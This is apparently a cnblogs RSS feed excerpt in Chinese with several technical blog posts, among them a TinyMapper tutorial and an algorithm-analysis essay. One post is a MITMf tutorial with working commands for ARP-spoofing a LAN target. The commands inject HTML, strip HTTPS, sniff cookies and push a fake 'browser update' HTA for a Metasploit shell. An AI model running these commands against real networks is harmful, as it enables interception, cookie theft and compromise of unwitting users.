root           /opt/zentao/www;        fastcgi_pass   127.0.0.1:9000;
fastcgi_index  index.php;
fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
include        fastcgi_params;
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;启动nginx并在防火墙上开放80端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 启动nginx
/usr/local/nginx/sbin/nginx
# 开放80端口
firewall-cmd --zone=public --add-port=80/tcp --permanent
firewall-cmd --reload&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
</description>
<pubDate>Sun, 14 Jan 2018 05:12:00 +0000</pubDate>
<dc:creator>Candyメ奶糖</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Candies/p/8282934.html</dc:identifier>
</item>
<item>
<title>TinyMapper 使用总结 - Pobin</title>
<link>http://www.cnblogs.com/arvinzhang/p/8282922.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/arvinzhang/p/8282922.html</guid>
<description>&lt;h2&gt;初识TinyMapper&lt;/h2&gt;
&lt;p&gt;TinyMapper是开源的对象映射框架，功能和AutoMapper一样。官网介绍，TinyMapper映射效率很高，下图是官方给的比较结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/724652/201801/724652-20180114110416394-303332904.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;TinyMapper使用简单，只有Bind，Mapper两个操作；而且支持的配置也很简单(很有限)。下面就让我们来进一步认识下TinyMapper。&lt;/p&gt;
&lt;h2&gt;安装TinyMapper&lt;/h2&gt;
&lt;p&gt;通过Nuget安装TinyMapper，本次使用版本为2.0.8。&lt;/p&gt;
&lt;h2&gt;TinyMapper映射&lt;/h2&gt;
&lt;p&gt;1. 绑定映射关系&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
public static void Bind&amp;lt;TSource, TTarget&amp;gt;();
public static void Bind&amp;lt;TSource, TTarget&amp;gt;(Action&amp;lt;IBindingConfig&amp;lt;TSource, TTarget&amp;gt;&amp;gt; config);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2. 执行映射，获取映射结果&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
public static TTarget Map&amp;lt;TSource, TTarget&amp;gt;(TSource source, TTarget target = default(TTarget));
public static TTarget Map&amp;lt;TTarget&amp;gt;(object source);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;注意：TinyMapper的映射对象必须是Public类型。&lt;/p&gt;
&lt;h3&gt;简单映射&lt;/h3&gt;
&lt;p&gt;创建两个映射对象：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;collapse:true;;gutter:true;&quot;&gt;
public class Product
{
        public Guid Id { get; set; }

        public string Name { get; set; }

        public decimal Price { get; set; }
}

public class ProductDTO
{
        public Guid Id { get; set; }

        public string Name { get; set; }

        public decimal Price { get; set; }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;绑定映射关系并执行映射：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;40&quot;&gt;
&lt;pre class=&quot;brush:csharp;collapse:true;;gutter:true;&quot;&gt;
[TestMethod]
public void TestSimple()
{
        var product = new Product()
        {
                Id = Guid.NewGuid(),
                Name = &quot;Product&quot; + DateTime.Now.Ticks,
                Price = 12
        };

        //1. 创建映射关系
        TinyMapper.Bind&amp;lt;Product, ProductDTO&amp;gt;();&lt;br/&gt;//TinyMapper.Bind&amp;lt;Product, ProductDTO&amp;gt;(); //直接建立对象绑定关系也是可以的

        //2. 执行映射
        var productDto = TinyMapper.Map&amp;lt;ProductDTO&amp;gt;(product);

        Assert.IsNotNull(productDto);
        Assert.AreEqual(12, productDto.Price);
        Assert.IsNotNull(productDto.Name);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;集合映射&lt;/h3&gt;
&lt;p&gt;仍然使用上面的映射对象，集合验证方式如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;42&quot;&gt;
&lt;pre class=&quot;brush:csharp;collapse:true;;gutter:true;&quot;&gt;
[TestMethod]
public void TestList()
{
        var products = new List&amp;lt;Product&amp;gt;()
        {
                new Product()
                {
                        Id = Guid.NewGuid(),
                        Name = &quot;Product&quot; + DateTime.Now.Ticks,
                        Price = 5
                },
                new Product()
                {
                        Id = Guid.NewGuid(),
                        Name = &quot;Product&quot; + DateTime.Now.Ticks,
                        Price = 10
                }
        };

        //1. 创建映射关系
        TinyMapper.Bind&amp;lt;List&amp;lt;Product&amp;gt;, List&amp;lt;ProductDTO&amp;gt;&amp;gt;();

        //2. 执行映射
        var productDtos = TinyMapper.Map&amp;lt;List&amp;lt;Product&amp;gt;&amp;gt;(products);

        Assert.IsNotNull(productDtos);
        Assert.AreEqual(2, productDtos.Count);
}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;执行映射转换时，TinyMapper不支持接口类型：IList&amp;lt;T&amp;gt;, ICollection&amp;lt;T&amp;gt;, IEnumerable&amp;lt;T&amp;gt;.&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
TinyMapper.Map&amp;lt;ICollection&amp;lt;Product&amp;gt;&amp;gt;(products); //执行时会抛出异常
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;映射配置&lt;/h3&gt;
&lt;p&gt;TinyMapper支持简单的映射配置：&lt;/p&gt;
&lt;h4&gt;指定字段映射&lt;/h4&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;40&quot;&gt;
&lt;pre class=&quot;brush:csharp;collapse:true;;gutter:true;&quot;&gt;
public class Product
{
        public Guid Id { get; set; }

        public string Name { get; set; }

        public decimal Price { get; set; }
}

public class ProductDTO
{
        public string Id { get; set; }

        public string Name { get; set; }

        public decimal Money { get; set; }
}

[TestMethod]
public void TestMapperConfig()
{
        var product = new Product()
        {
                Id = Guid.NewGuid(),
                Name = &quot;Product&quot; + DateTime.Now.Ticks,
                Price = 12
        };

        //1. 创建映射关系
        TinyMapper.Bind&amp;lt;Product, ProductDTO&amp;gt;(cfg =&amp;gt;
        {
                cfg.Bind(src =&amp;gt; src.Price, dest =&amp;gt; dest.Money); //指定字段映射
        });

        //2. 执行映射
        var productDto = TinyMapper.Map&amp;lt;ProductDTO&amp;gt;(product);

        Assert.IsNotNull(productDto);
        Assert.AreEqual(12, productDto.Money);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;映射时不管某些字段&lt;/h4&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
TinyMapper.Bind&amp;lt;Product, ProductDTO&amp;gt;(cfg =&amp;gt;
{
        cfg.Ignore(src =&amp;gt; src.Price); //映射时不管某些字段
});
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;注意：TinyMapper默认会根据字段名称进行映射，而不管字段的类型。也就是说，如果源对象字段名称与目标对象字段名称一致，但是类型不一致且不能进行强制转换时，会抛出异常。&lt;/p&gt;
&lt;h2&gt;TinyMapper简单封装&lt;/h2&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;37&quot;&gt;
&lt;pre class=&quot;brush:csharp;collapse:true;;gutter:true;&quot;&gt;
public class TinyMapperUtil
{
        /// &amp;lt;summary&amp;gt;
        /// 创建映射关系
        /// &amp;lt;/summary&amp;gt;
        /// &amp;lt;typeparam name=&quot;TSource&quot;&amp;gt;&amp;lt;/typeparam&amp;gt;
        /// &amp;lt;typeparam name=&quot;TDestination&quot;&amp;gt;&amp;lt;/typeparam&amp;gt;
        public static void Bind&amp;lt;TSource, TDestination&amp;gt;()
        {
                TinyMapper.Bind&amp;lt;TSource, TDestination&amp;gt;();
        }

        /// &amp;lt;summary&amp;gt;
        /// 映射对象
        /// &amp;lt;/summary&amp;gt;
        /// &amp;lt;typeparam name=&quot;TDestination&quot;&amp;gt;&amp;lt;/typeparam&amp;gt;
        /// &amp;lt;param name=&quot;source&quot;&amp;gt;&amp;lt;/param&amp;gt;
        /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
        public static TDestination Map&amp;lt;TDestination&amp;gt;(object source)
        {
                if (source == null)
                {
                        return default(TDestination);
                }
                else
                {
                        return TinyMapper.Map&amp;lt;TDestination&amp;gt;(source);
                }
        }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;以上基本是TinyMapper提供的所有特性及操作。相比AutoMapper，功能很有限，不支持扁平映射，也不支持接口集合转换等。但使用起来还是很简单的，仍然可以考虑在项目中使用。&lt;/p&gt;
&lt;p&gt;相关资料可以参考官网介绍：http://tinymapper.net/&lt;/p&gt;
</description>
<pubDate>Sun, 14 Jan 2018 04:17:00 +0000</pubDate>
<dc:creator>Pobin</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/arvinzhang/p/8282922.html</dc:identifier>
</item>
<item>
<title>算法分析：如何分析一个算法的效率好坏？ - backslash112</title>
<link>http://www.cnblogs.com/sirkevin/p/8282595.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sirkevin/p/8282595.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;span&gt;什么是算法分析&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们说算法分析的时候我们在说什么？（狭义的技术层面的定义）：&lt;/p&gt;
&lt;p&gt;算法分析指的是：&lt;strong&gt;对算法在运行时间和存储空间这两种资源的利用效率进行研究。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即时间效率和空间效率。&lt;/p&gt;

&lt;p&gt;时间效率指算法运行有多快；&lt;/p&gt;
&lt;p&gt;空间效率指算法运行时需要多少额外的存储空间。&lt;/p&gt;
&lt;p&gt;（时间效率也叫时间复杂度；空间效率也叫空间复杂度。）&lt;/p&gt;

&lt;p&gt;在计算机时代早期，时间和空间这两种资源都是及其昂贵的。但经过半个多世纪的发展，计算机的速度和存储容量都已经提升了好几个数量级。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;现在空间效率已经不是我们关注的重点了&lt;/span&gt;，但时间效率的重要性并没有减弱到这种可以忽略的程度。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;所以，当我们分析一个算法的的时候，我们&lt;span&gt;只关注它的时间效率&lt;/span&gt;。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;算法分析通用思路：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们遇到一个算法时，我们可以用这样一个通用的思路去分析它：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1. 输入规模&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先第一步考虑这个算法的输入规模是什么？即输入参数，再换句话说也就是待解决的问题有多大？&lt;/p&gt;
&lt;p&gt;从这里入手是因为一个显而易见的规律就是，&lt;span&gt;不管使用什么算法，输入规模越大，运行效率肯定会更长。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;输入规模的确定要根据具体要解决的实际问题的细节来决定，相同的问题不同的细节，输入规模是不一样的。比如：一个拼写检查的算法，&lt;/p&gt;
&lt;p&gt;如果算法关注的是单独的字符检查，那么字符的数量就是输入规模的大小；&lt;/p&gt;
&lt;p&gt;如果算法关注的是词组搭配的检查，那么这个输入规模就要比单独的字符检查的输入规模要小，这里输入规模就是词的数量了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. 运行时间的度量单位&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接下来第二步考虑这个算法的运行时间，即这个算法运行地快慢。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们可以简单地用计时的方法，即某个算法运行了多少毫秒。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;但这个方式有一个缺陷就是在不同计算机上，相同算法的运行时间是不一样，因为有的电脑快有的电脑慢。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;所以有没有一种度量方法可以排除这些无关因素？&lt;/p&gt;
&lt;p&gt;答案是肯定的，我们可以&lt;span&gt;关注算法执行了多少步&lt;/span&gt;，即操作的运行次数。而且为了简化问题我们只需关注最重要的操作步骤，即所谓的基本操作，因为基本操作已经足够可以决定这个算法的品质。&lt;/p&gt;
&lt;p&gt;比如一个算法通常是最内层的循环中是最费时的操作，那我们就只需要把它循环了多少次作为基本操作进行研究。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. 增长次数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里需要延伸的一点是在大规模的输入情况下考虑执行次数的增长次数。因为针对小规模的输入，在运行时间的差别上不太明显。比如只对100个数字进行排序，不管你用什么排序算法，时间效率都差不多。只有在输入规模变大的时候，算法的差异才变得既明显又重要了起来。&lt;/p&gt;
&lt;p&gt;简单来说，&lt;/p&gt;
&lt;div&gt;
&lt;ol&gt;&lt;li&gt;如果一个算法在输入规模变大时，但运行时间平缓增长，那么我们就可以说它就是一个效率高的算法；&lt;/li&gt;
&lt;li&gt;而如果一个算法在输入规模变大时，它的运行时间成指数级增长，那就可以说这个算法的效率很差。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;p&gt;总而言之就是，&lt;span&gt;对基本操作的大规模输入情况下的变化的研究才更具有深远意义。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4. 算法的最优、最差和平均效率&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们了解了输入规模对算法时间效率的会产生影响，但算法的执行效率却不仅仅只受输入规模的影响，某些情况下，&lt;span&gt;算法的执行效率更取决于输入参数的细节&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;比如：一个简单的顺序查找的算法，在数组里查找数字 9：&lt;/p&gt;
&lt;p&gt;在数组 list1 = [1, 2, 3, 4, 5, 6, 7, 8, 9] 里查找数字 9 和在相同的输入规模的另一个数组 list2 = [9, 1, 2, 3, 4, 5, 6, 7, 8]里查找数字 9，在数组 list2 的执行效率肯定更高。&lt;/p&gt;
&lt;p&gt;上面小例子中的两个数组就体现了两个极端：输入最优情况和输入最坏情况。&lt;/p&gt;
&lt;p&gt;相对应的，&lt;/p&gt;
&lt;p&gt;在输入最优情况下的算法就叫最优效率；&lt;/p&gt;
&lt;p&gt;在输入最坏情况下的算法就叫最差效率；&lt;/p&gt;
&lt;p&gt;在这里有两个经验性的规则：&lt;/p&gt;
&lt;div&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;最优效率的分析远远不如最差效率分析重要（因为最差效率可以确定算法运行时间的上界）；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;如果一个算法的最优效率都不能满足我们的要求，那么我们就可以立即抛弃它。&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;p&gt;在现实情况下，输入是“随机”的，既不会是最优输入也不会是最坏输入。所以这里又要引出一个概念，即：平均效率。&lt;/p&gt;
&lt;p&gt;首先指出，我们&lt;span&gt;绝不能用“最优效率”和“最差效率”的平均数求得平均效率，即便有时间这个平均数和真正的平均效率巧合地一致。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;正确的步骤是：我们要对输入规模 n 做一些假设。&lt;/p&gt;
&lt;p&gt;对于上面的顺序查找算法的例子，标准的假设有两个：&lt;/p&gt;
&lt;div&gt;
&lt;ol&gt;&lt;li&gt;输入里包含目标数字，那么算法会成功查找到目标数字，此时，成功查找概率是 p(0 &amp;lt;= p &amp;lt;= 1)；&lt;/li&gt;
&lt;li&gt;对于任意数字 i，匹配发生在列表的第 i 个位置的概率是相同的。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;p&gt;基于这两个假设求平均效率可得：&lt;/p&gt;
&lt;div&gt;
&lt;ol&gt;&lt;li&gt;成功查找到目标的情况下，对于任意 i，第一次匹配发生在第 i 个位置的概率都是 p/n，此时，算法所做的比较次数是 i；&lt;/li&gt;
&lt;li&gt;输入数组里不包含目标数字，那么算法不成功查找，比较次数是 n，在这种情况下，可能性是 (1-p)。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;p&gt;由此，平均效率 C(n) = p(n+1) / 2 + n(1-p)&lt;/p&gt;
&lt;p&gt;C(n) = [1 * p/n + 2 * p/n + ... + i * p/n + ... + n * p/n] + n*(1-p)&lt;/p&gt;
&lt;p&gt;=  p/n[1 + 2 + ... + i + ... + n] + n(1-p)&lt;/p&gt;
&lt;p&gt;= p/n * n(n+1)/2 + n(1-p)&lt;/p&gt;
&lt;p&gt;= p(n+1) / 2 + n(1-p)               &lt;/p&gt;

&lt;p&gt;由此可知，&lt;/p&gt;
&lt;div&gt;
&lt;ol&gt;&lt;li&gt;如果 p = 1，也就是说成功率是 100%，查找一定能成功，代入公式可得 (n+1)/2，即大约要查找数组中一半的元素；&lt;/li&gt;
&lt;li&gt;如果 p = 0，也就是说成功率是 0%，查找必定失败，代入公式可得 n，即算法会对所有元素全部查找一遍。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;从这个例子可以发现，平均效率的研究要比最差效率和最优效率的研究困难很多：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我们要将输入规模 n 划分为几种类型，对于同类型的输入，使得算法的执行次数是相同的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;结束：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;算法是计算机科学的基础，以后会继续更新算法相关的随笔，对算法感兴趣的朋友欢迎关注本博客，也欢迎大家留言讨论。&lt;/p&gt;
&lt;p&gt;我们正处于大数据时代，对数据处理感兴趣的朋友欢迎查看另一个系列随笔：&lt;/p&gt;

&lt;p class=&quot;p1&quot;&gt; &lt;/p&gt;
&lt;div class=&quot;image-package&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;分享一张学校图书馆的照片：&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/238796/201801/238796-20180114115928957-1695226869.jpg&quot; alt=&quot;&quot; width=&quot;700&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 14 Jan 2018 04:04:00 +0000</pubDate>
<dc:creator>backslash112</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sirkevin/p/8282595.html</dc:identifier>
</item>
<item>
<title>局域网中间人：MITMf使用 - 方方和圆圆</title>
<link>http://www.cnblogs.com/diligenceday/p/8076497.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/diligenceday/p/8076497.html</guid>
<description>&lt;p&gt;　　安装流程参考github官方地址：&lt;a href=&quot;https://github.com/byt3bl33d3r/MITMf/wiki/Installation&quot; target=&quot;_blank&quot;&gt;https://github.com/byt3bl33d3r/MITMf/wiki/Installation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　安装相关依赖：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
apt-&lt;span&gt;get&lt;/span&gt; install python-dev python-setuptools libpcap0.&lt;span&gt;8&lt;/span&gt;-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　下载项目：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
git clone https:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;github.com/byt3bl33d3r/MITMf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　安装相关的子项目和依赖：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
cd MITMf &amp;amp;&amp;amp; git submodule init &amp;amp;&amp;amp; git submodule update --recursive
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　安装相关依赖：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
pip install -r requirements.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　启动并查看MITMf的帮助文件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
python mitmf.py -h
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/497865/201712/497865-20171221005820521-424871149.png&quot; alt=&quot;&quot; width=&quot;693&quot; height=&quot;453&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　在网页中注入HTML代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
python mitmf.py -i wlan0 --spoof --arp  --target &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.131&lt;/span&gt; --gateway &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.1&lt;/span&gt; --inject --html-payload &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;h1&amp;gt;6666666666666666666&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　让目标机器浏览的图片全部翻转：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
python mitmf.py -i wlan0 --spoof --arp  --target &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.131&lt;/span&gt; --gateway &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.1&lt;/span&gt;  --upsidedownternet 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/497865/201712/497865-20171221010225990-931076506.png&quot; alt=&quot;&quot; width=&quot;733&quot; height=&quot;205&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　启动sslstrip，把所有的https请求转化为http请求&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
python mitmf.py -i wlan0 --spoof --arp  --target &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.131&lt;/span&gt; --gateway &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.1&lt;/span&gt; --hsts 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;img src=&quot;https://images2017.cnblogs.com/blog/497865/201712/497865-20171221010624818-443674328.png&quot; alt=&quot;&quot; width=&quot;782&quot; height=&quot;456&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　在目标机器的 网页中注入 hta 文件， 诱导用户下载， 配合metaspolit可以直接得到shell：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
python mitmf.py -i wlan0 --spoof --arp  --target &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.131&lt;/span&gt; --gateway &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.1&lt;/span&gt;  --hta --text &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;更新浏览器&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/497865/201712/497865-20171221012036834-152543052.png&quot; alt=&quot;&quot; width=&quot;749&quot; height=&quot;370&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　监听目标用户的cookies&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
python mitmf.py -i wlan0 --spoof --arp  --target &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.131&lt;/span&gt; --gateway &lt;span&gt;172.16&lt;/span&gt;.&lt;span&gt;42.1&lt;/span&gt;  --ferretng
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/497865/201712/497865-20171221013219146-328136099.png&quot; alt=&quot;&quot; width=&quot;687&quot; height=&quot;341&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　总体来说， 功能非常强大，但是运行的时候， 被攻击的目标机器经常会卡死， 导致网页无法打开 ， 用户体验不好， 所以还是用bettercap更靠谱&lt;/p&gt;
&lt;p id=&quot;mySignature&quot;&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/497865/201708/497865-20170822213048964-1075012817.jpg&quot; alt=&quot;&quot; width=&quot;110&quot;/&gt;&lt;span&gt;作者：&lt;/span&gt; &lt;strong&gt;&lt;span&gt;&lt;a href=&quot;http://www.cnblogs.com/diligenceday/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;&lt;span&gt;NONO&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;span&gt;出处：&lt;/span&gt;&lt;a href=&quot;http://www.cnblogs.com/diligenceday/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://www.cnblogs.com/diligenceday/&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;企业网站：&lt;a href=&quot;http://www.idrwl.com/&quot; target=&quot;_blank&quot;&gt;http://www.idrwl.com/&lt;/a&gt;&lt;br/&gt;开源博客：&lt;a href=&quot;http://www.github.com/sqqihao&quot; target=&quot;_blank&quot;&gt;http://www.github.com/sqqihao&lt;/a&gt;&lt;br/&gt;&lt;span&gt;QQ：&lt;/span&gt;&lt;span&gt;287101329&lt;/span&gt;&lt;br/&gt;&lt;span&gt;微信：&lt;/span&gt;&lt;span&gt;18101055830&lt;/span&gt; &lt;/p&gt;
</description>
<pubDate>Sun, 14 Jan 2018 03:36:00 +0000</pubDate>
<dc:creator>方方和圆圆</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/diligenceday/p/8076497.html</dc:identifier>
</item>
<item>
<title>SAP HANA中的SLT简介 - 氢氦</title>
<link>http://www.cnblogs.com/hhelibeb/p/8258915.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hhelibeb/p/8258915.html</guid>
<description>&lt;p&gt;在以SAP系统作为主要ERP的企业中，不同系统之间的数据库数据同步是个重要的工作。对于这种需求，除了开发ABAP接口之外，也有高效的工具可用。SLT就是其中之一。&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SLT是SAP的第一个ETL（Extract-Transform-Load）工具，它允许实时加载和复制数据，或者将数据从源系统和非源系统调度到SAP HANA数据库。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SAP SLT服务器使用基于触发器的复制方式以实现从源系统到目标系统的数据传递。&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;SLT服务器可以安装在单独的系统或SAP ECC系统上。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;SLT系统的好处如下：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;允许&lt;strong&gt;实时&lt;/strong&gt;或按计划时间进行数据复制。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;在实时复制数据的过程中，可以以SAP HANA格式迁移数据。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
